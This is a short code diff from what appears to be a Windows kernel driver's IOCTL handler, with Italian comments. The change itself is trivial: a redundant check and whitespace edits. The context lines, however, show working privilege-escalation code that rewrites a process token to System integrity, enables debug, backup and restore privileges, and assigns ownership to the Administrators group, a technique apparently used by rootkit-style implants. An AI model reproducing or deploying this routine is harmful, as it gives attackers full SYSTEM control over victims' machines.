@@ -331,14 +331,15 @@ NTSTATUS do_ioctl_admin(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATI
 			if (sid_array[i].SID[0]==0x00000101 && sid_array[i].SID[1]==0x10000000 && sid_array[i].SID[2]>=0x00002000 && sid_array[i].SID[2]<0x00003000) {
 			
 				// Eleva l'integrity level a SYSTEM
-				sid_array[i].SID[2] = 0x00004000;
+				if (sid_array[i].SID[2] != 0x00004000)
+					sid_array[i].SID[2] = 0x00004000;
 
 				// Setta SeDebugPrivilege | SeBackupPrivilege | SeRestorePrivilege
 				// backup e restore servono per montare gli hive del reg
 				*privilege |= 0x00160000;	// privilegi che hai
 				privilege += 2;
 				*privilege |= 0x00160000;	// privilegi abilitati
-
+				
 				// Ownership al gruppo Administrator
 				for (j = 0; j < sid_count; j++)
 					if (sid_array[j].Attributes & 0x00000010) 
@@ -348,7 +349,7 @@ NTSTATUS do_ioctl_admin(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATI
 			}
 		}
 	}
-
+	
 	return STATUS_SUCCESS;
 }
 
